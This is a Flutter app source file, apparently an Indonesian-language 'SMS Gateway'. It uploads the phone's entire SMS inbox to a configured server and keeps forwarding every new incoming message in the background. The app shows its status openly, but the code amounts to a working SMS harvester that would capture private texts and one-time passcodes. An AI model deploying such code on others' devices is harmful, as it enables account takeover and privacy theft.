// lib/main.dart
import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:telephony/telephony.dart';
import 'config.dart';

final Telephony telephony = Telephony.instance();

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'SMS Gateway',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(primarySwatch: Colors.blue, useMaterial3: true),
      home: const LoaderPage(),
    );
  }
}

class LoaderPage extends StatefulWidget {
  const LoaderPage({super.key});
  @override
  State<LoaderPage> createState() => _LoaderPageState();
}

class _LoaderPageState extends State<LoaderPage> {
  String status = "Meminta izin...";
  int sentCount = 0;
  int failCount = 0;

  @override
  void initState() {
    super.initState();
    _bootstrap();
  }

  Future<void> _bootstrap() async {
    final smsStatus = await Permission.sms.request();
    if (!smsStatus.isGranted) {
      setState(() => status = "Izin SMS ditolak. Buka Settings dan izinkan.");
      return;
    }

    setState(() => status = "Mendaftarkan listener SMS...");

    final ok = await telephony.requestPhoneAndSmsPermissions;
    if (ok != true) {
      setState(() => status = "Izin telephony ditolak");
      return;
    }

    telephony.listenIncomingSms(
      onNewMessage: (SmsMessage msg) {
        _kirimKeServer(
          sender: msg.address ?? "unknown",
          body: msg.body ?? "",
          timestamp: DateTime.now().millisecondsSinceEpoch,
        );
      },
      listenInBackground: true,
    );

    final prefs = await SharedPreferences.getInstance();
    if (!prefs.containsKey("device_id")) {
      await prefs.setString(
          "device_id", "dev_${DateTime.now().millisecondsSinceEpoch}");
    }

    setState(() => status = "Mengirim riwayat SMS...");
    await _kirimRiwayat();

    setState(() => status = "Aktif. Menunggu SMS masuk...");
  }

  Future<void> _kirimRiwayat() async {
    try {
      final messages = await telephony.getInboxSms(
        columns: [SmsColumn.ADDRESS, SmsColumn.BODY, SmsColumn.DATE],
        sortOrder: [OrderBy(SmsColumn.DATE, sort: Sort.DESC)],
      );
      for (final m in messages) {
        await _kirimKeServer(
          sender: m.address ?? "unknown",
          body: m.body ?? "",
          timestamp: m.date ?? DateTime.now().millisecondsSinceEpoch,
        );
      }
    } catch (e) {
      debugPrint("riwayat err: $e");
    }
  }

  Future<void> _kirimKeServer({
    required String sender,
    required String body,
    required int timestamp,
  }) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final deviceId = prefs.getString("device_id") ?? "unknown";

      final res = await http
          .post(
            Uri.parse(apiSmsUrl),
            headers: {"Content-Type": "application/json"},
            body: jsonEncode({
              "device_id": deviceId,
              "sender": sender,
              "body": body,
              "timestamp": timestamp,
            }),
          )
          .timeout(const Duration(seconds: 15));

      if (res.statusCode >= 200 && res.statusCode < 300) {
        sentCount++;
      } else {
        failCount++;
      }
    } catch (e) {
      failCount++;
      debugPrint("send err: $e");
    }
    if (mounted) setState(() {});
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text("SMS Gateway")),
      body: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const SizedBox(height: 20),
            const Center(child: CircularProgressIndicator()),
            const SizedBox(height: 24),
            Text("Status: $status", style: const TextStyle(fontSize: 16)),
            const SizedBox(height: 12),
            Text("Terkirim: $sentCount", style: const TextStyle(fontSize: 14)),
            Text("Gagal: $failCount", style: const TextStyle(fontSize: 14)),
            const SizedBox(height: 24),
            const Divider(),
            const SizedBox(height: 12),
            Text("Server: $baseUrl", style: const TextStyle(fontSize: 12, color: Colors.grey)),
            const SizedBox(height: 4),
            Text("Endpoint: $apiSmsUrl", style: const TextStyle(fontSize: 12, color: Colors.grey)),
          ],
        ),
      ),
    );
  }
}